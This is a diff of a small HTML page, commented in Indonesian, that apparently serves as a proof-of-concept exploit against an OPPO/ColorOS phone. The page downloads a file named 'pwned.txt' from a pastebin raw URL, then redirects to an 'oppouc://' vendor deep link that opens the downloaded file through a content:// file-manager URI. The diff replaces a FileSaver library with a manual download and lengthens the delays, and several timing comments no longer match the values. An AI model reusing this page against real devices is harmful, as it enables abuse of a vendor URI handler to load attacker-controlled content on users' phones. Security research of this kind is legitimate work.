@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
     <script type="text/javascript">
         async function downloadFile(url, filename) {
             try {
@@ -10,12 +9,25 @@
                     throw new Error('Network response was not ok');
                 }
                 const blob = await response.blob();
-                saveAs(blob, filename);
+                const urlObject = URL.createObjectURL(blob);
+                
+                // Buat elemen <a> untuk mendownload file
+                const a = document.createElement('a');
+                a.href = urlObject;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
 
-                // Jika berhasil, berikan jeda 2 detik kemudian alihkan ke URL yang diinginkan
+                // Berikan jeda 2 detik kemudian alihkan ke URL yang diinginkan
                 setTimeout(function() {
                     window.location.replace('oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/pwned.txt');
-                }, 12000); // 2000 milidetik = 2 detik
+                }, 30000); // 2000 milidetik = 2 detik
+
+                // Revoke object URL after some delay to release memory
+                setTimeout(function() {
+                    URL.revokeObjectURL(urlObject);
+                }, 60000); // 10 detik
             } catch (error) {
                 // Menampilkan pesan kesalahan menggunakan alert
                 alert('Error during file download: ' + error.message);
@@ -26,7 +38,7 @@
             setTimeout(function() {
                 // Contoh penggunaan
                 downloadFile('https://pastebin.com/raw/dxbeDqv2', 'pwned.txt');
-            }, 5000); // 2000 milidetik = 2 detik
+            }, 15000); // 2000 milidetik = 2 detik
         };
     </script>
 </head>
